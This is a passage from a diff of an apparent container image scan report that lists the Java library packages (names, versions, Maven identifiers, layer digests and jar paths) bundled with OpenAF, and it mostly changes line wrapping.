-                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-collections4@4.5.0 
-                 │       │            ╰ UID : 72513cdccf1d063 
-                 │       ├ Version   : 4.5.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [88]  ╭ Name      : org.apache.commons:commons-compress 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-compress@1.28.0 
-                 │       │            ╰ UID : a82eeb62843349ae 
-                 │       ├ Version   : 1.28.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [89]  ╭ Name      : org.apache.commons:commons-csv 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-csv@1.14.1 
-                 │       │            ╰ UID : 250a69832ed56f8d 
-                 │       ├ Version   : 1.14.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [90]  ╭ Name      : org.apache.commons:commons-email 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-email@1.6.0 
-                 │       │            ╰ UID : 973048c510561123 
-                 │       ├ Version   : 1.6.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [91]  ╭ Name      : org.apache.commons:commons-lang3 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-lang3@3.20.0 
-                 │       │            ╰ UID : 85a4dd2e7bf06fed 
-                 │       ├ Version   : 3.20.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [92]  ╭ Name      : org.apache.commons:commons-math3 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.apache.commons/commons-math3@3.6.1 
-                 │       │            ╰ UID : ce9b8a6c7e85850 
-                 │       ├ Version   : 3.6.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [93]  ╭ Name      : org.bouncycastle:bcprov-jdk18on 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.bouncycastle/bcprov-jdk18on@1.84 
-                 │       │            ╰ UID : aa9cc21dd2336977 
-                 │       ├ Version   : 1.84 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/S3/bcprov-jdk18on-1.84.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [94]  ╭ Name      : org.eclipse.jetty.compression:jetty-compression-common 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.compression/jetty-compression-common@
-                 │       │            │       12.1.8 
-                 │       │            ╰ UID : 33039562bfd52098 
-                 │       ├ Version   : 12.1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [95]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-core-client 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-core-client
-                 │       │            │       @12.1.8 
-                 │       │            ╰ UID : c1075786cc5bdd2e 
-                 │       ├ Version   : 12.1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [96]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-core-common 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-core-common
-                 │       │            │       @12.1.8 
-                 │       │            ╰ UID : 94de3a6f5d13c6e9 
-                 │       ├ Version   : 12.1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [97]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-jetty-api 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-jetty-api@1
-                 │       │            │       2.1.8 
-                 │       │            ╰ UID : 73e595faf9ba86ec 
-                 │       ├ Version   : 12.1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [98]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-jetty-client 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-jetty-clien
-                 │       │            │       t@12.1.8 
-                 │       │            ╰ UID : db6397111aa534a 
-                 │       ├ Version   : 12.1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [99]  ╭ Name      : org.eclipse.jetty.websocket:jetty-websocket-jetty-common 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty.websocket/jetty-websocket-jetty-commo
-                 │       │            │       n@12.1.8 
-                 │       │            ╰ UID : 5cca9370ca6cc71e 
-                 │       ├ Version   : 12.1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [100] ╭ Name      : org.eclipse.jetty:jetty-client 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-client@12.1.8 
-                 │       │            ╰ UID : 1f5c76d2f9443ff9 
-                 │       ├ Version   : 12.1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [101] ╭ Name      : org.eclipse.jetty:jetty-http 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-http@12.1.8 
-                 │       │            ╰ UID : 1a238b29c95bf018 
-                 │       ├ Version   : 12.1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [102] ╭ Name      : org.eclipse.jetty:jetty-io 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-io@12.1.8 
-                 │       │            ╰ UID : 30f6598d7163432d 
-                 │       ├ Version   : 12.1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [103] ╭ Name      : org.eclipse.jetty:jetty-util 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.eclipse.jetty/jetty-util@12.1.8 
-                 │       │            ╰ UID : e793b260df8ee45b 
-                 │       ├ Version   : 12.1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [104] ╭ Name      : org.fusesource.hawtjni:hawtjni-runtime 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.hawtjni/hawtjni-runtime@1.17 
-                 │       │            ╰ UID : cf88955c9d0ae18b 
-                 │       ├ Version   : 1.17 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [105] ╭ Name      : org.fusesource.jansi:jansi 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi@1.18 
-                 │       │            ╰ UID : 8ad8d3ab8ae11065 
-                 │       ├ Version   : 1.18 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [106] ╭ Name      : org.fusesource.jansi:jansi-freebsd32 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-freebsd32@1.8 
-                 │       │            ╰ UID : 87b73bc3f694180c 
-                 │       ├ Version   : 1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [107] ╭ Name      : org.fusesource.jansi:jansi-freebsd64 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-freebsd64@1.8 
-                 │       │            ╰ UID : 68d99c3788225531 
-                 │       ├ Version   : 1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [108] ╭ Name      : org.fusesource.jansi:jansi-linux32 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-linux32@1.8 
-                 │       │            ╰ UID : b748a87749ace306 
-                 │       ├ Version   : 1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [109] ╭ Name      : org.fusesource.jansi:jansi-linux64 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-linux64@1.8 
-                 │       │            ╰ UID : 26eee13eafbc9417 
-                 │       ├ Version   : 1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [110] ╭ Name      : org.fusesource.jansi:jansi-native 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-native@1.8 
-                 │       │            ╰ UID : 6fdce73a584d6707 
-                 │       ├ Version   : 1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [111] ╭ Name      : org.fusesource.jansi:jansi-osx 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-osx@1.8 
-                 │       │            ╰ UID : 907023130116e83c 
-                 │       ├ Version   : 1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [112] ╭ Name      : org.fusesource.jansi:jansi-windows32 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-windows32@1.8 
-                 │       │            ╰ UID : ab926f311d1d4210 
-                 │       ├ Version   : 1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [113] ╭ Name      : org.fusesource.jansi:jansi-windows64 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.fusesource.jansi/jansi-windows64@1.8 
-                 │       │            ╰ UID : edf1cd987a2068b8 
-                 │       ├ Version   : 1.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [114] ╭ Name      : org.jctools:jctools-core 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.jctools/jctools-core@4.0.5 
-                 │       │            ╰ UID : 58fe95ed59ed9509 
-                 │       ├ Version   : 4.0.5 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/netty-common-4.2.12.Final.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [115] ╭ Name      : org.jetbrains:annotations 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.jetbrains/annotations@13.0 
-                 │       │            ╰ UID : c0161a29fedca08e 
-                 │       ├ Version   : 13.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/S3/annotations-13.0.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [116] ╭ Name      : org.jspecify:jspecify 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.jspecify/jspecify@1.0.0 
-                 │       │            ╰ UID : ed86e540bb7b216a 
-                 │       ├ Version   : 1.0.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/S3/jspecify-1.0.0.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [117] ╭ Name      : org.semver4j:semver4j 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.semver4j/semver4j@6.0.0 
-                 │       │            ╰ UID : 452bf269462d8b69 
-                 │       ├ Version   : 6.0.0 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [118] ╭ Name      : org.slf4j:slf4j-api 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.slf4j/slf4j-api@2.0.17 
-                 │       │            ╰ UID : e6e431b8b5e0302a 
-                 │       ├ Version   : 2.0.17 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [119] ╭ Name      : org.slf4j:slf4j-nop 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.slf4j/slf4j-nop@2.0.17 
-                 │       │            ╰ UID : 67713c09148cf9b 
-                 │       ├ Version   : 2.0.17 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [120] ╭ Name      : org.snakeyaml:snakeyaml-engine 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.snakeyaml/snakeyaml-engine@3.0.1 
-                 │       │            ╰ UID : 37957af2faa98731 
-                 │       ├ Version   : 3.0.1 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/Kube/snakeyaml-engine-3.0.1.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [121] ╭ Name      : org.snmp4j:snmp4j 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.snmp4j/snmp4j@3.9.7 
-                 │       │            ╰ UID : 2bdda8a0d94fe3fd 
-                 │       ├ Version   : 3.9.7 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [122] ╭ Name      : org.snmp4j:snmp4j-agent 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.snmp4j/snmp4j-agent@3.8.3 
-                 │       │            ╰ UID : 7d83d9c8b188faec 
-                 │       ├ Version   : 3.8.3 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/openaf.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ├ [123] ╭ Name      : org.xerial.snappy:snappy-java 
-                 │       ├ Identifier ╭ PURL: pkg:maven/org.xerial.snappy/snappy-java@1.1.10.8 
-                 │       │            ╰ UID : af735d5e5d938188 
-                 │       ├ Version   : 1.1.10.8 
-                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                 │       │            │         95f0ceaa 
-                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                 │       │                      93da5788 
-                 │       ├ FilePath  : openaf/S3/snappy-java-1.1.10.8.jar 
-                 │       ╰ AnalyzedBy: jar 
-                 ╰ [124] ╭ Name      : org.yaml:snakeyaml 
-                         ├ Identifier ╭ PURL: pkg:maven/org.yaml/snakeyaml@2.4 
-                         │            ╰ UID : 47990f5b3f8915ac 
-                         ├ Version   : 2.4 
-                         ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab09293113b83
-                         │            │         95f0ceaa 
-                         │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54ebf30433b
-                         │                      93da5788 
-                         ├ FilePath  : openaf/Kube/snakeyaml-2.4.jar 
-                         ╰ AnalyzedBy: jar 
+╰ [1] ╭ Target         : Java 
+      ├ Class          : lang-pkgs 
+      ├ Type           : jar 
+      ├ Packages        ╭ [0]   ╭ Name      : com.carrotsearch.thirdparty:simple-xml-safe 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.carrotsearch.thirdparty/simple-xml-safe@2.7.1 
+      │                 │       │            ╰ UID : 13b037b1fd5d66f 
+      │                 │       ├ Version   : 2.7.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/S3/simple-xml-safe-2.7.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [1]   ╭ Name      : com.fasterxml.jackson.core:jackson-annotations 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-annotations@2
+      │                 │       │            │       .21 
+      │                 │       │            ╰ UID : a68585b707b894c6 
+      │                 │       ├ Version   : 2.21 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [2]   ╭ Name      : com.fasterxml.jackson.core:jackson-core 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.21.1 
+      │                 │       │            ╰ UID : a0ae06e5352781bf 
+      │                 │       ├ Version   : 2.21.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [3]   ╭ Name      : com.fasterxml.jackson.core:jackson-databind 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.1 
+      │                 │       │            ╰ UID : f5a07e107dd30f70 
+      │                 │       ├ Version   : 2.21.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [4]   ╭ Name      : com.fasterxml.jackson.dataformat:jackson-dataformat-toml 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.dataformat/jackson-datafor
+      │                 │       │            │       mat-toml@2.21.2 
+      │                 │       │            ╰ UID : 207de139b4c562ba 
+      │                 │       ├ Version   : 2.21.2 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [5]   ╭ Name      : com.fasterxml.jackson.dataformat:jackson-dataformat-yaml 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.dataformat/jackson-datafor
+      │                 │       │            │       mat-yaml@2.20.0 
+      │                 │       │            ╰ UID : 16f220ba7aa2c313 
+      │                 │       ├ Version   : 2.20.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/jackson-dataformat-yaml-2.20.0.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [6]   ╭ Name      : com.fasterxml.jackson.datatype:jackson-datatype-jsr310 
